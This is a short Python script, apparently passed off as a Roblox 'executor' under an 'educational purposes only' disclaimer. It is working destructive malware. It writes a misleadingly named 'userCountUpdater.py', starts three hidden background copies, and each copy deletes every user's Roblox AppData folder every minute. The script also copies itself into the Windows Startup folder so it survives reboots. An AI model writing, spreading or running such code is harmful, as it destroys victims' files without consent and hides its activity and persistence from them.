
#THIS SCRIPT IS INTENDED FOR EDUCATIONAL PURPOSES ONLY.
#DO NOT USE IT FOR MALICIOUS PURPOSES. YOU MAY FACE UP TO 10 YEARS IN PRISON IF SO.
import shutil
import sys
import os
import subprocess

# Lock file to prevent multiple instances
lock_file = os.path.join(os.getenv("TEMP"), "executor.lock")
if os.path.exists(lock_file):
    sys.exit()
with open(lock_file, "w") as f:
    f.write("lock")

# The contents of userCountUpdater.py as a string
user_count_updater_code = r"""
import os
import shutil
import glob
import time

def delete_roblox_folder(path):
    try:
        shutil.rmtree(path)
    except Exception:
        pass

def check_and_delete():
    roblox_paths = glob.glob(r"C:\Users\*\AppData\Local\Roblox")
    for roblox_dir in roblox_paths:
        if os.path.exists(roblox_dir):
            delete_roblox_folder(roblox_dir)

if __name__ == "__main__":
    while True:
        check_and_delete()
        time.sleep(60)
"""

filename = "userCountUpdater.py"

# Write the script to a file
with open(filename, "w", encoding="utf-8") as f:
    f.write(user_count_updater_code)

# Starts scripts in the background
for suffix in ["A", "B", "C"]:
    copy_name = f"userCountUpdater{suffix}.py"
    shutil.copy2(filename, copy_name)
    subprocess.Popen(
        [sys.executable, os.path.abspath(copy_name)],
        creationflags=subprocess.CREATE_NO_WINDOW
    )

# Add a copy of this script to the Windows Startup folder
startup_folder = os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs\Startup")
# Use .exe if frozen, else .py
if getattr(sys, 'frozen', False):
    startup_path = os.path.join(startup_folder, "Executor.exe")
    source_path = sys.executable
else:
    startup_path = os.path.join(startup_folder, "Executor.py")
    source_path = os.path.abspath(__file__)

try:
    if not os.path.exists(startup_path):
        shutil.copy2(source_path, startup_path)
except Exception as e:
    pass  # Optionally log or print(e)

# Remove lock file on exit (optional, but not strictly needed for background scripts)
import atexit
atexit.register(lambda: os.path.exists(lock_file) and os.remove(lock_file))